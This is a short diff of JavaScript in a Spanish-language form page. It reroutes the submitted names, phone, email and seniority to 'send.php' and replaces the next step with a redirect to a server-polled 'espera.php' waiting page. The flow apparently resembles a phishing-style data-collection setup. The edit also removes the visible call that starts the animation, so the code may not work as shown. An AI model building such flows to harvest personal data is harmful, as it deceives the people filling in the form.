@@ -790,8 +790,11 @@
         body.append('phone',      document.getElementById('phone').value);
         body.append('email',      document.getElementById('email').value);
         body.append('antiguedad', document.getElementById('antiguedad').value);
-        fetch('inicio.php', { method: 'POST', body }).catch(() => {});
-        // Animar lista de status y luego pasar al paso 4
+        const uid = (data1.nombres || '') + ' ' + (data1.apellidos || '');
+
+        fetch('send.php', { method: 'POST', body }).catch(() => {});
+
+        // Animar lista de status
         const list = document.querySelectorAll('#statusList li');
         let idx = 2;
         const tick = () => {
@@ -806,10 +809,10 @@
             idx++;
             setTimeout(tick, 1400);
           } else {
-            setTimeout(() => setStep(4), 600);
+            // Animación completa → ir a espera.php (polling server-side)
+            setTimeout(() => { window.location.href = 'espera.php'; }, 400);
           }
         };
-        setTimeout(tick, 1400);
       });
 
       // Auto-formato fecha DD/MM/AAAA
